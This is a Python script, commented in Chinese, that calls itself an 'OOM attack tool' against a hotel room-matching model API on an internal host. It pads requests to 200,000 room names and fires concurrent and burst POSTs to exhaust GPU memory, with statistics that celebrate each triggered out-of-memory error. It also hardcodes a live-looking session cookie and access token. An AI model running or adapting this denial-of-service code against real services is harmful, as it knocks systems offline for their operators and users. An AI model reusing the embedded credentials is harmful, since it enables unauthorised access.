#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging

# ===== 全局配置 =====
CONFIG = {
    # API配置
    "API_URL": "http://10.0.0.110:13009/match/",
    "MODEL": "cross_entropy_result1_nosplct",
    "TOKEN": "tourmind_room_match",
    "COOKIE": "admintools_user_session=MTc0MjIwMjI3OHw5bzlBTUp3VHBUNjk3OTJlU0xfSnVwanVfM05haTZZaDhWUUxMeDRMNXNIQ1ZPcmdYVW41ZzZ2d0J0VTdXSzZVRUVnY0RSZ09VN0k9fDI5N-SfNq50abl6wb9cLn0lzTqhq9Fq8l_L-jkQ4OKN",

    # 默认数组大小 - 增大以增加显存压力
    "DEFAULT_ARRAY_SIZE": 200000,

    # 并发配置 - 用于显存溢出攻击
    "CONCURRENT_REQUESTS": 15,  # 并发请求数
    "TOTAL_REQUESTS": 100,  # 总请求数
    "REQUEST_INTERVAL": 0.001,  # 请求间隔（秒）

    # 默认房间名称 - 使用更长更复杂的文本增加处理负担
    "DEFAULT_SPL_ROOMS": [
        "Executive Premium Deluxe King Suite with Panoramic Sea View Balcony Non-Smoking Late Check-In After 23:00 Continental Breakfast Included",
        "Superior Family Triple Room with Extra Bed Twin Configuration Non-Smoking City View Connecting Rooms Available Child-Friendly Facilities",
        "Standard Double Room Economy Package Rate Continental Breakfast Included Flexible Cancellation Policy Airport Shuttle Service Available",
        "Luxury Presidential Suite with Private Jacuzzi Terrace Garden View Honeymoon Package VIP Services 24-Hour Room Service Butler",
        "Business Class Single Room Work Desk High-Speed WiFi Airport Shuttle Service Executive Lounge Access Complimentary Newspaper",
        "Grand Royal Suite Master Bedroom Living Room Kitchen Dining Area Panoramic View Private Elevator Concierge Service",
        "Comfort Twin Beds Family Room Connecting Rooms Available Child-Friendly Facilities Baby Cot Available High Chair Service",
        "Boutique Designer Room King Size Bed Modern Amenities Complimentary Minibar Smart TV Entertainment System Rain Shower",
        "Penthouse Suite Top Floor Private Elevator VIP Services 24-Hour Butler Personal Chef Service Limousine Transfer",
        "Classic Vintage Room Traditional Decor Historic Building Heritage Collection Antique Furniture Period Features"
    ],

    "DEFAULT_S_ROOMS": [
        "Executive Premium Deluxe King Suite with Panoramic Sea View Balcony Non-Smoking Late Check-In After 23:00 Continental Breakfast Included",
        "Superior Family Triple Room with Extra Bed Twin Configuration Non-Smoking City View Connecting Rooms Available Child-Friendly Facilities",
        "Standard Double Room Economy Package Rate Continental Breakfast Included Flexible Cancellation Policy Airport Shuttle Service Available",
        "Luxury Presidential Suite with Private Jacuzzi Terrace Garden View Honeymoon Package VIP Services 24-Hour Room Service Butler",
        "Business Class Single Room Work Desk High-Speed WiFi Airport Shuttle Service Executive Lounge Access Complimentary Newspaper",
        "Grand Royal Suite Master Bedroom Living Room Kitchen Dining Area Panoramic View Private Elevator Concierge Service",
        "Comfort Twin Beds Family Room Connecting Rooms Available Child-Friendly Facilities Baby Cot Available High Chair Service",
        "Boutique Designer Room King Size Bed Modern Amenities Complimentary Minibar Smart TV Entertainment System Rain Shower",
        "Penthouse Suite Top Floor Private Elevator VIP Services 24-Hour Butler Personal Chef Service Limousine Transfer",
        "Classic Vintage Room Traditional Decor Historic Building Heritage Collection Antique Furniture Period Features"
    ]
}

# 日志配置
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(threadName)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# 全局统计
stats = {
    "requests_sent": 0,
    "requests_success": 0,
    "requests_failed": 0,
    "oom_errors": 0,
    "start_time": None
}


def extend_array(base_array, target_size):
    """扩展数组到指定大小，循环使用原数组元素"""
    if len(base_array) >= target_size:
        return base_array[:target_size]

    result = base_array.copy()
    while len(result) < target_size:
        result.append(base_array[len(result) % len(base_array)])

    return result


def create_match_request(array_size=None, spl_rooms=None, s_rooms=None, request_id=None, session=None):
    """
    创建房间匹配请求

    Args:
        array_size: 数组大小，默认使用配置值
        spl_rooms: 供应商房间名称列表
        s_rooms: 标准房间名称列表
        request_id: 请求ID
        session: requests会话对象

    Returns:
        匹配结果字典
    """
    # 使用默认值
    if array_size is None:
        array_size = CONFIG["DEFAULT_ARRAY_SIZE"]

    if spl_rooms is None:
        spl_rooms = CONFIG["DEFAULT_SPL_ROOMS"]

    if s_rooms is None:
        s_rooms = CONFIG["DEFAULT_S_ROOMS"]

    if session is None:
        session = requests

    # 扩展数组
    extended_spl_rooms = extend_array(spl_rooms, array_size)
    extended_s_rooms = extend_array(s_rooms, array_size)

    # 构建请求数据
    request_data = {
        "spl_room_names": extended_spl_rooms,
        "spl_room_bed_names": [""] * array_size,
        "s_room_names": extended_s_rooms,
        "s_room_bed_names": [""] * array_size,
        "model": CONFIG["MODEL"],
        "token": CONFIG["TOKEN"]
    }

    # 构建请求头
    headers = {
        'Cookie': CONFIG["COOKIE"],
        'cookie': CONFIG["COOKIE"],
        'User-Agent': f'OOM Attack Client/1.0.0 - Request {request_id or "unknown"}',
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Host': '10.0.0.110:13009',
        'Connection': 'keep-alive'
    }

    try:
        start_time = time.time()

        response = session.post(
            CONFIG["API_URL"],
            headers=headers,
            json=request_data,
            timeout=1000
        )

        response.raise_for_status()
        result = response.json()

        end_time = time.time()
        response_time = end_time - start_time

        # 更新统计
        stats["requests_success"] += 1

        logger.info(
            f"请求 {request_id} 成功，数组大小: {array_size}，响应时间: {response_time:.2f}秒")

        return {
            "status": "success",
            "request_id": request_id,
            "response_time": response_time,
            "result": result
        }

    except requests.exceptions.Timeout:
        stats["requests_failed"] += 1
        logger.warning(f"请求 {request_id} 超时")
        return {"status": "timeout", "request_id": request_id}

    except requests.exceptions.HTTPError as e:
        stats["requests_failed"] += 1
        error_msg = str(e)

        # 检查是否是显存溢出相关错误
        if any(keyword in error_msg.lower() for keyword in ["out of memory", "cuda", "memory"]):
            stats["oom_errors"] += 1
            logger.error(f"请求 {request_id} 触发显存溢出: {error_msg}")
            return {"status": "oom", "request_id": request_id, "error": error_msg}
        else:
            logger.error(f"请求 {request_id} HTTP错误: {error_msg}")
            return {"status": "http_error", "request_id": request_id, "error": error_msg}

    except Exception as e:
        stats["requests_failed"] += 1
        error_msg = str(e)
        logger.error(f"请求 {request_id} 失败: {error_msg}")
        return {"status": "error", "request_id": request_id, "error": error_msg}


def concurrent_oom_attack():
    """并发攻击以触发显存溢出"""
    logger.info("开始并发显存溢出攻击")
    logger.info(
        f"配置: 数组大小={CONFIG['DEFAULT_ARRAY_SIZE']}, 并发数={CONFIG['CONCURRENT_REQUESTS']}, 总请求数={CONFIG['TOTAL_REQUESTS']}")

    stats["start_time"] = time.time()

    # 使用线程池执行并发请求
    with ThreadPoolExecutor(max_workers=CONFIG["CONCURRENT_REQUESTS"]) as executor:
        # 为每个线程创建独立的session
        sessions = [requests.Session()
                    for _ in range(CONFIG["CONCURRENT_REQUESTS"])]

        futures = []

        # 提交所有请求任务
        for i in range(CONFIG["TOTAL_REQUESTS"]):
            session_idx = i % len(sessions)
            session = sessions[session_idx]

            future = executor.submit(
                create_match_request,
                array_size=CONFIG["DEFAULT_ARRAY_SIZE"],
                request_id=i+1,
                session=session
            )
            futures.append(future)
            stats["requests_sent"] += 1

            # 小间隔避免瞬间压垮服务器
            time.sleep(CONFIG["REQUEST_INTERVAL"])

        # 收集结果
        results = []
        for future in as_completed(futures):
            try:
                result = future.result()
                results.append(result)

                # 如果检测到显存溢出，记录并继续
                if result.get("status") == "oom":
                    logger.error(f"检测到显存溢出！请求ID: {result.get('request_id')}")

            except Exception as e:
                logger.error(f"获取请求结果时出错: {e}")
                results.append({"status": "executor_error", "error": str(e)})

        # 关闭所有session
        for session in sessions:
            session.close()

    # 打印统计结果
    print_attack_stats()

    return results


def burst_attack():
    """快速突发攻击 - 在极短时间内发送大量请求"""
    logger.info("开始快速突发攻击")

    # 创建更多并发线程进行突发攻击
    burst_concurrent = min(50, CONFIG["TOTAL_REQUESTS"])  # 最多50个并发
    burst_requests = CONFIG["TOTAL_REQUESTS"]

    logger.info(
        f"突发攻击配置: 数组大小={CONFIG['DEFAULT_ARRAY_SIZE']}, 并发数={burst_concurrent}, 总请求数={burst_requests}")

    with ThreadPoolExecutor(max_workers=burst_concurrent) as executor:
        # 一次性提交所有请求，最大压力
        futures = []

        for i in range(burst_requests):
            future = executor.submit(
                create_match_request,
                array_size=CONFIG["DEFAULT_ARRAY_SIZE"],
                request_id=f"burst-{i+1}",
                session=requests
            )
            futures.append(future)
            stats["requests_sent"] += 1

        # 立即收集所有结果
        results = []
        for future in as_completed(futures):
            try:
                result = future.result()
                results.append(result)

                if result.get("status") == "oom":
                    logger.error(
                        f"突发攻击检测到显存溢出！请求ID: {result.get('request_id')}")

            except Exception as e:
                logger.error(f"突发攻击获取结果时出错: {e}")

    return results


def print_attack_stats():
    """打印攻击统计信息"""
    if stats["start_time"]:
        elapsed = time.time() - stats["start_time"]
        success_rate = (stats["requests_success"] / stats["requests_sent"]
                        * 100) if stats["requests_sent"] > 0 else 0

        print("\n" + "="*60)
        print("显存溢出攻击统计")
        print("="*60)
        print(f"总发送请求数: {stats['requests_sent']}")
        print(f"成功请求数: {stats['requests_success']}")
        print(f"失败请求数: {stats['requests_failed']}")
        print(f"显存溢出错误: {stats['oom_errors']}")
        print(f"成功率: {success_rate:.2f}%")
        print(f"运行时间: {elapsed:.2f}秒")
        print(
            f"平均RPS: {stats['requests_sent']/elapsed:.2f}" if elapsed > 0 else "平均RPS: N/A")
        if stats['oom_errors'] > 0:
            print(f"🎯 成功触发 {stats['oom_errors']} 次显存溢出！")
        print("="*60)


if __name__ == "__main__":
    import sys

    print("房间匹配显存溢出攻击工具")
    print("="*60)
    print(f"目标API: {CONFIG['API_URL']}")
    print(f"数组大小: {CONFIG['DEFAULT_ARRAY_SIZE']}")
    print(f"并发请求数: {CONFIG['CONCURRENT_REQUESTS']}")
    print(f"总请求数: {CONFIG['TOTAL_REQUESTS']}")
    print("="*60)

    if len(sys.argv) > 1:
        mode = sys.argv[1].lower()
    else:
        mode = input(
            "选择攻击模式:\n1. 单次请求 (single)\n2. 并发攻击 (concurrent)\n3. 突发攻击 (burst)\n请输入选择 (1/2/3 或 single/concurrent/burst): ").strip().lower()

    if mode in ['1', 'single']:
        logger.info("执行单次大数组请求")
        result = create_match_request(request_id="single-test")
        if result:
            print(f"单次请求结果: {result.get('status')}")

    elif mode in ['2', 'concurrent']:
        logger.info("执行并发攻击模式")
        results = concurrent_oom_attack()

    elif mode in ['3', 'burst']:
        logger.info("执行突发攻击模式")
        results = burst_attack()
        print_attack_stats()

    else:
        logger.info("未选择有效模式，执行默认并发攻击")
        results = concurrent_oom_attack()
